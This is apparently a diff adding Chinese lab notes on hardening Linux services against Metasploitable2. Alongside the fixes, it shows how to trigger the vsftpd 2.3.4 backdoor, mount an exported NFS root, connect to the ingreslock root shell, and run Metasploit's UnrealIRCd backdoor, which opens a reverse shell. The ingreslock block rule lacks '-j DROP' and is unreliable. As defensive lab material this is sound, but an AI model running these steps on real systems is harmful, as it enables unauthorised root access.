@@ -42,8 +42,12 @@ SyslogFacility AUTHPRIV
 
 ### vsftpd
 提供ftp服务  
+
+端口：主动模式下数据端口为TCP20，服务端口为TCP21
+
 配置文件：/etc/vsftpd.conf  
 加固：修改配置文件， v2.3.4版本还需封堵后门  
+
 ```conf
 #是否允许匿名登录  YES/NO
 anonymous_enable=NO #不允许
@@ -77,13 +81,238 @@ userlist_file=/etc/vsftpd.userlist
 关于v2.3.4笑脸后门：  
 通过使用任意账户名加上:)作为账号登录，密码任意，vsftpd会在6200TCP端口上映射一个shell  
 封堵方法有两个，一个是通过使用用户列表，使用用户列表白名单后后门不会被触发，另一个是通过iptables规则禁止后门连接
+
 ```
 220 (vsFTPd 2.3.4)
 Name (192.168.247.250:leaf): niconiconi:)
 331 Please specify the password.
 Password:
 
+>此时ftp会话已经关闭，目标主机开放了TCP 6200端口, 可使用telnet连接
 
-iptables -I 
+$ telnet 192.168.247.250 6200
+
+封堵：
+iptables -I OUTPUT -p TCP --source-port 6200 -s 0.0.0.0/0 -j DROP
 ```
+
+附关于FTP客户端的命令
+
+| 命令   | 参数                                | 备注                                                         |
+| ------ | ----------------------------------- | ------------------------------------------------------------ |
+| open   | 主机名/IP地址                       | 与host建立连接                                               |
+| user   | 用户名                              | 进行登录                                                     |
+| get    | 文件名[, 本机目录]                  | 下载文件，默认下载到连接时处于的目录                         |
+| put    | 本机文件路径，[目标主机路径/文件名] | 上传文件，如果不指定目标路径，则会根据本机文件路径上传至目标主机对应路径 |
+| delete | 文件名                              | 删除文件                                                     |
+| ?      | 无                                  | 查看能使用的命令                                             |
+
+### rexec rlogin rsh
+
+提供远程登录服务
+
+端口： TCP512 513 514
+
+日志文件：/var/log/auth.log
+
+各用户的配置文件：~/.rhost
+
+全局配置文件：/etc/hosts.equiv
+
+配置文件的优先级为：用户目录的rhosts文件 > 全局文件
+
+配置文件语法：
+
+```
++ + #允许任意主机使用空密码登录任意账户
+- - #不允许任意主机使用空密码登录任意账户
+允许登录的主机 允许登录的用户
+
+```
+
+连接方法：
+
+```
+usage: rlogin [-8ELKd] [-e char] [-i user] [-l user] [-p port] host
+$ rlogin -l 用户名 主机名
+$ rsh -l 用户名 主机名
+rexec暂未找到
+#如果提示需要验证sshkey则说明系统需要安装rsh-client,刚刚使用的是openssh-clinet
+$ sudo apt-get install rsh-client
+```
+
+加固：三个服务使用同一个账户配置文件，可能因配置不当导致空密码登录
+
+```
+/etc/hosts.equiv
+- -
+
+/home/$USER/.rhosts
+- -
+```
+
+###　NFS(Network File System)
+
+提供远程访问文件系统服务
+
+端口：
+
+```
+111/tcp  open  rpcbind     2 (RPC #100000)
+| rpcinfo: 
+|   program version   port/proto  service
+|   100000  2            111/tcp  rpcbind
+|   100000  2            111/udp  rpcbind
+|   100003  2,3,4       2049/tcp  nfs
+|   100003  2,3,4       2049/udp  nfs
+|   100005  1,2,3      33447/udp  mountd
+|   100005  1,2,3      40094/tcp  mountd
+|   100021  1,3,4      42007/udp  nlockmgr
+|   100021  1,3,4      47973/tcp  nlockmgr
+|   100024  1          35568/udp  status
+|_  100024  1          52080/tcp  status
+```
+
+配置文件：/etc/exports
+
+加固：配置不当会导致任意人拥有文件读写权限
+
+```
+metasploittable2 漏洞利用
+kali: 
+$ sudo apt-get install rpcbind
+$ sudo apt-get install nfs-common
+
+查看对方主机nfs服务开启情况
+$ rpcinfo -p 主机IP
+   program vers proto   port  service
+    100000    2   tcp    111  portmapper
+    100000    2   udp    111  portmapper
+    100024    1   udp  47150  status
+    100024    1   tcp  56260  status
+    100003    2   udp   2049  nfs
+    100003    3   udp   2049  nfs
+    100003    4   udp   2049  nfs
+    100021    1   udp  55596  nlockmgr
+    100021    3   udp  55596  nlockmgr
+    100021    4   udp  55596  nlockmgr
+    100003    2   tcp   2049  nfs
+    100003    3   tcp   2049  nfs
+    100003    4   tcp   2049  nfs
+    100021    1   tcp  47481  nlockmgr
+    100021    3   tcp  47481  nlockmgr
+    100021    4   tcp  47481  nlockmgr
+    100005    1   udp  34429  mountd
+    100005    1   tcp  47216  mountd
+    100005    2   udp  34429  mountd
+    100005    2   tcp  47216  mountd
+    100005    3   udp  34429  mountd
+    100005    3   tcp  47216  mountd
+
+查看对方主机导出的目录
+$ showmount -e 主机IP
+Export list for 192.168.247.250:
+/ *
+
+将对方主机的根目录挂载到本地
+# mkdir /mnt/target
+# mount -t nfs 192.168.247.250:/ /mnt/target
+```
+
+修补：
+
+```conf
+# /etc/exports: the access control list for filesystems which may be exported
+#               to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync) hostname2(ro,sync)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt)
+# /srv/nfs4/homes  gss/krb5i(rw,sync)
+#
+
+#metasploittable2中该行配置导致任何人拥有读写权限，注释掉
+#/       *(rw,sync,no_root_squash,no_subtree_check)
+
+重启服务
+# /etc/init.d/nfs-kernel-server restart
+```
+
+### ingreslock
+
+后门程序，提供远程root shell连接
+
+端口：1524
+
+利用：
+
+```
+$ telnet 192.168.247.250 1524
+Trying 192.168.247.250...
+Connected to 192.168.247.250.
+Escape character is '^]'.
+root@metasploitable:/# whoami
+root
+```
+
+加固：
+
+```
+封堵端口
+iptables -I INPUT -p TCP --destination-port 1524
+```
+
+
+
+### UnreaIRCD IRC
+
+```
+exploit/unix/irc/unreal_ircd_3281_backdoor UnrealIRCD 3.2.8.1 Backdoor Command Execution
+```
+
+端口：6667
+
+利用：
+
+```
+msf5 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit 
+
+[*] Started reverse TCP double handler on 192.168.247.1:4444 
+[*] 192.168.247.250:6667 - Connected to 192.168.247.250:6667...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
+[*] 192.168.247.250:6667 - Sending backdoor command...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo 1lgzlRUNckIyjS2i;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "1lgzlRUNckIyjS2i\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (192.168.247.1:4444 -> 192.168.247.250:50365) at 2019-03-07 14:44:39 +0800
+
+whoami
+root
+```
+
+加固：
+
+```
+封堵端口
+# iptables -I INPUT -p TCP --destination-port 6667 -j DROP
+```
+
+
+
+ 
+
+
+
+
+
+
 
